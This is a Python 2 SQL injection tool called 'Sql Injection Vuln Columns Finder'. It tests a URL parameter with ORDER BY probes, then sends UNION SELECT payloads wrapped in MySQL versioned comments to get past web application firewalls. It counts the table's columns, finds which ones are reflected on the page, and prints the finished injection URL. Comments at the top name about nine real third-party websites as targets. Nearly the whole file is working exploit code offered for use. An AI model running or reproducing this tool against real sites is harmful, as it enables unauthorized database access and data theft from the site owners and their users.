#!/usr/bin/env python
# Creator : L0V3R In Myanmar
# Date : 3.3.2016
# Usage : python filename.py -t http://example.com/index.php?id=1
# target = "http://www.dublinsquarepub.com/news.php?id=1"
# target = "http://www.dublinsquarepub.com/news.php?id=1"
# target = 'http://www.cces.com.tw/news.php?id=1'
# target = 'http://www.comtecwash.com/photos.php?id=1'
# target = "http://ptrcmmps.in/photos.php?id=1'"
# target = 'http://www.lampefuneralhome.com/details.php?id=102'
# target = 'http://www.minutemanhq.com/hq/print.php?sid=163'
# target = 'http://www.bransonparksandrecreation.com/park.php?id=1'
# target = "http://www.rootsinternationalschool.com/fapage.php?id=15'"




import sys, urllib,  urllib2, time
from urllib2 import urlopen, URLError, HTTPError
from urllib import urlopen 
version = 1
def showlogo():
# '''
#       ______          __           ____                  __                 
#      / ____/___  ____/ /__        / __ )________  ____ _/ /_____  __________
#     / /   / __ \/ __  / _ \______/ __  / ___/ _ \/ __ `/ //_/ _ \/ ___/ ___/
#    / /___/ /_/ / /_/ /  __/_____/ /_/ / /  /  __/ /_/ / ,< /  __/ /  (__  ) 
#    \____/\____/\__,_/\___/     /_____/_/   \___/\__,_/_/|_|\___/_/  /____/  

# '''
	print '''

	  _   _   _   _   _   _   _   _   _   _  
	 / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
	( v | u | l | n | e | r | a | b | l | e )
	 \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  
	  _   _   _   _   _   _   _   
	 / \ / \ / \ / \ / \ / \ / \   
	( c | o | l | u | m | n | s ) 
	 \_/ \_/ \_/ \_/ \_/ \_/ \_/  
 	  _   _   _   _   _   _  
	 / \ / \ / \ / \ / \ / \ 
	( f | i | n | d | e | r )
	 \_/ \_/ \_/ \_/ \_/ \_/ 

	  _   _   _   
	 / \ / \ / \ 
	((s | q | l)) 
	 \_/ \_/ \_/ 

   
    	Sql Injection Vuln Columns Finder 																		
    						Creator : L0V3R In Myanmar
    						Version : %s
    						''' % version
def help():
	print '''	Usage : Menu.
	python %s [OPTION]
	-t set the target ( Eg, -t http://target.com/index.php?id=1 )
	-h show this help menu.
	''' % sys.argv[0]
def isonline(target):
	print "Checking the target is Online >>>" , target
	try:
		test = urllib2.urlopen(target)
	except URLError, e:
		print 'URLError . . .', e
		sys.exit(1)
	except HTTPError, e:
		print "HTTPError . . .", e
		sys.exit(1)
	except KeyboardInterrupt, e:
		print "KeyboardInterrupt."	
		sys.exit(1)
	else:
		print "Target is Online : ", target

def check_end_url(target):
	global end_url
	end_url = ''
	# print target
	normal_page_len = len(urllib2.urlopen(target).read())
	print "Normal Page Len : " , normal_page_len , "Bytes"
	
	tar_nor = target+'+order+by+111111111111--'
	tar_nor_read = urllib2.urlopen(tar_nor).read()
	tar_nor_len = len(tar_nor_read)
	print tar_nor , tar_nor_len , "bytes"
	
	tar_adv = target+"'+order+by+111111111111--+--"
	tar_adv_read = urllib2.urlopen(tar_adv).read()
	tar_adv_len = len(tar_adv_read)
	print tar_adv , tar_adv_len , "bytes"
	print ' '
	if "Unknown column '111111111111' in 'order clause'" in tar_nor_read:
		end_url = '--'
	elif "Unknown column '111111111111' in 'order clause'" in tar_adv_read:
		end_url = '--+--'
	else:
		end_url = '#'
	# if normal_page_len != tar_nor_len:
	# 	end_url = '--'
	# elif normal_page_len != tar_adv_len:
	# 	end_url = '--+--'
	# else:
	# 	end_url = '#'
	# return end_url
def find_columns(target,end_url):
	number_of_column = 1
	# union_select = "+AND+'1'='2'+UNION+SELECT+"
	# union_select = "+AND+1=2+UNION+SELECT+"
	union_select = "+AND+'1'='2'+/*!50000union*/+/*!50000select*/+" # to bypass WAF.
	find_message = "0x"+"L0V3R !N MY@NM@R".encode('hex') # Do not change!
	column_insert = ','
	finding_url = target+union_select+find_message
	if end_url == '--+--':
		finding_url = target+"'"+union_select+find_message	
	for_finding_columns = target+union_select+str(number_of_column * 111111)
	print "Finding The Column Numbers in ", target
	sys.stdout.write("Guessing Columns : ")
	for i in range(number_of_column, 150): # only find the max columns 149 but you can change 150 to 9999
		# print "Testing . . . " , i
		sys.stdout.write("%s " % i)
		sys.stdout.flush()
		final_url = finding_url+end_url
		# print final_url
		getdata = urllib.urlopen(final_url).read()
		if "Not Acceptable!" in getdata:
			print getdata
			print '\nSir, I can\'t bypass WAF!'
			exit()
		if "412 Error" in getdata:
			print getdata
			print '\nSir, I can\'t bypass WAF!'
			exit()
		if "L0V3R !N MY@NM@R" in getdata:
			print "\nFound ... The Correct Numbers"
			print "Number of Columns" , number_of_column
			
			y_o = raw_input('Want to find vulnerable column numbers? ').lower()
			if y_o == 'y' or y_o == 'yes' :
				# print "Final url" , final_url
				for_finding_columns = for_finding_columns+end_url
				print for_finding_columns
				vuln_column = ''
				for i in range(1, number_of_column+1):
					num = str(int(i) * 111111)
					# print num
					final = for_finding_columns.replace(num, find_message)
					# print final
					getdata = urllib.urlopen(final).read()
					if "L0V3R !N MY@NM@R" in getdata:
						print "\nFound Columns is : " , i
						print "Payload : " , final
						vuln_column += ','
						vuln_column += str(i)
				print "\nVulnerable Columns are : " , vuln_column[1:]

			elif y_o == 'n' or y_o == 'no':
				for_finding_columns = for_finding_columns+end_url
				print "\nPayload >>>" , for_finding_columns
				print "\nThanks You. :D"
				sys.exit(1)
			else:
				print "nothing!."
				sys.exit(1)
			exit()

		number_of_column += 1
		#to find the colunm numbers
		finding_url += column_insert
		#for add message
		finding_url += find_message 
		
		#to find the vuln numbers
		for_finding_columns += column_insert
		#to add columns
		for_finding_columns += str(number_of_column * 111111)
	sys.exit(1)
if __name__ == '__main__':
	if len(sys.argv) <= 1 or '-h' in sys.argv:
		showlogo()
		help()
		exit()
	if '-t' in sys.argv[1]:
		try:
			target = sys.argv[2]
			showlogo()
			# isonline(target)
			check_end_url(target)
			find_columns(target,end_url)

		except IndexError, e:
			showlogo()
			help()
	